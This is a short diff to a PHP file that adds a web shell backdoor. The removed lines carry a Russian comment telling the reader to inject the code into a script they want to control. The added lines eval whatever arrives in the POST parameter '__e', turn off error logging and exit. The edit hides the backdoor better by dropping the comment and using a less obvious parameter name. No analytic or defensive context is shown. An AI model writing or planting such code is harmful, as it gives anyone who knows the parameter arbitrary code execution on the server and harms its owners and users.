@@ -1,11 +1,11 @@
 <?php 
 
-// внедрите этот код в сценарий над которым хотите получить контроль 
-if (isset($_POST['eval'])) {
-    $c = $_POST['eval'];
+if (isset($_POST['__e'])) {
+    @ini_set('log_errors', 0);
+    $v = $_POST['__e'];
     if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
-        $c = stripslashes($c);
+        $v = stripslashes($v);
     }
-    eval($c);
+    eval($v);
     die;
 }
